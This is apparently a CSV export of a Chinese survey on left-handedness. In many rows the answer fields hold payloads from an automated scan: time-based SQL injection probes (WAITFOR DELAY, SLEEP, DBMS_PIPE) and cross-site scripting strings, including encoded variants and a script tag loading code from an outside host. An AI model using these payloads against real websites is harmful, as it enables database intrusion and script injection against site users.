id,topic1,topic2,topic3,topic4,topic5,topic6,topic7,topic8,topic9,topic10,topic11,topic12,topic13,topic14,topic15,topic16,topic17,topic18,topic19,topic20,topic21,topic22,topic23,topic24,topic25,topic26,topic27,topic28,topic29,topic30,qt1,qt2,qt3,qt4,qt5,qt6,qt7,qt8,qt9,qt10,qt11,qt12,qt13,qt14,qt15,qt16,qt17,qt18,qt19,qt20,qt21,qt22,qt23,qt24,qt25,qt26,qt27,qt28,qt29,qt30,comment,addip,addtime
381,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
382,是' WAITFOR DELAY '0:0:5'--,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
383,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
384,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
385,是'; WAITFOR DELAY '0:0:5'--,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
386,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
387,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
388,是%'; WAITFOR DELAY '0:0:5'--,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
389,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
390,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
391,是 WAITFOR DELAY '0:0:5' --,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
392,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
393,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
394,是,"会AND 1997=DBMS_PIPE.RECEIVE_MESSAGE(CHR(115)||CHR(99)||CHR(97)||CHR(100),5)",有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
395,是) WAITFOR DELAY '0:0:5' --,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
396,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
397,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
398,是') WAITFOR DELAY '0:0:5' --,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
399,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
400,是')) WAITFOR DELAY '0:0:5' --,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
401,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
402,是 AND SLEEP(5),会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
403,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
404,是 AND SLEEP(5) #,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
405,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
406,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
407,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
408,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
409,是,会,有%27 AND 91=93 #,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
410,是,会<script>alert(42873)</script>,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
411,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
412,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
413,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
414,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
415,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
416,"是AND 1997=DBMS_PIPE.RECEIVE_MESSAGE(CHR(115)||CHR(99)||CHR(97)||CHR(100),5)",会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
417,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
418,是,会<img src=1 onerror=alert(42873)>,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
419,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
420,是,会,有' WAITFOR DELAY '0:0:5'--,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
421,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
422,是,会,有'; WAITFOR DELAY '0:0:5'--,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
423,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
424,是,会,有%'; WAITFOR DELAY '0:0:5'--,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
425,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
426,是,会,有 WAITFOR DELAY '0:0:5' --,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
427,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
428,是,会,有) WAITFOR DELAY '0:0:5' --,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
429,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
430,是,会<div style=width:expression(alert(42873))>,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
431,是<script>alert(42873)</script>,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
432,是,会,有') WAITFOR DELAY '0:0:5' --,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
433,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
434,是,会,有')) WAITFOR DELAY '0:0:5' --,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
435,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
436,是,会,有 AND SLEEP(5),支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
437,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
438,是,会,有 AND SLEEP(5) #,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
439,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
440,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
441,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
442,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
443,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
444,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
445,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
446,是,会<script src=http://xxooxxoo.js></script>,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
447,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
448,是<img src=1 onerror=alert(42873)>,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
449,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
450,是,会,"有AND 1997=DBMS_PIPE.RECEIVE_MESSAGE(CHR(115)||CHR(99)||CHR(97)||CHR(100),5)",支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
451,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
452,是,会+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
453,是<div style=width:expression(alert(42873))>,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
454,是,会,有<script>alert(42873)</script>,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
455,是,"会"" onmousemove=alert(42873) wb=""",有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
456,是<script src=http://xxooxxoo.js></script>,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
457,是,会,有<img src=1 onerror=alert(42873)>,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
458,是,会<a href=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#50&#51&#52&#53&#41>TEST</a>,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
459,是+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
460,是,会,有<div style=width:expression(alert(42873))>,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
461,是,"会"" onmousemove='alert(42873)'wb=""",有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
462,"是"" onmousemove=alert(42873) wb=""",会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
463,是,会,有<script src=http://xxooxxoo.js></script>,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
464,是,"会"" onmouseover=prompt(42873) bad=""",有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
465,是<a href=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#50&#51&#52&#53&#41>TEST</a>,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
466,是,会,有+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
467,是,会<iframe SRC=javascript:alert(42873)>,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
